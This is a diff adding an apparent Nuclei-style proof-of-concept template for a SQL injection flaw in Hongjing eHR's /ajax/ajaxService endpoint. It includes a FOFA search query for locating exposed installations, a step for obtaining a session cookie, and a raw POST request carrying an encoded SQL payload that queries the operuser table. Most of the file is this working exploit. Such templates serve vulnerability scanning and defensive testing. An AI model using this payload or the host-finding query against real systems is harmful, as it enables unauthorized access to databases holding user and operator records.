@@ -1,0 +1,33 @@
+id: poc-cghuyvimvpbkg9om
+info:
+  name: 宏景eHR ajaxajaxService SQL注入漏洞复现
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cghuyvimvpbkg9om'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cghuyvimvpbkg9om
+    fofa: body="hjaxmanage.js" && (body="/template/signature/encryptionlock/websocket.js" || body="/ajax/basic.js")
+http:
+- raw:
+  - '获取cookie
+
+    /templates/index/getpassword.jsp
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1723974634212-9a243008-99c6-46c3-a00e-64406bf41ce8.png)
+
+    POST /ajax/ajaxService HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: 抓到的cookie
+
+    Content-Type: application/x-www-form-urlencoded
+
+    __type=extTrans&__xml={"functionId":"151211001137","sql":"select~20sys.fn_sqlvarbasetostr(HASHBYTES(''MD5'',''1''))~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
